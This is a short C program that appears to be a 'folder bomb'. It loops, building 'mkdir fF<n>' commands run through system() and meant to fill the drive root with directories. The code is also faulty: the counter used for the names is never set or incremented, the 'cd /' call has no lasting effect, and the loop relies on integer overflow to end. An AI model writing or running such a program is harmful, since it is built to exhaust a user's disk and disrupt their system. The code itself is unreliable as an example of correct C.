#include<stdio.h>
#include<stdlib.h>
#include<string.h>
int main(){
    int i,a=2;
    while(a>1){
        char comm[1000]="mkdir ";
        char filename[1000]="fF";
        char fileInc[1000];
        itoa(i,fileInc,10);
        strcat(filename,fileInc);
        strcat(comm,filename);
        system("c:");
        system("cd /");
        system(comm);
        a+=1;
    }
    return 0;
}


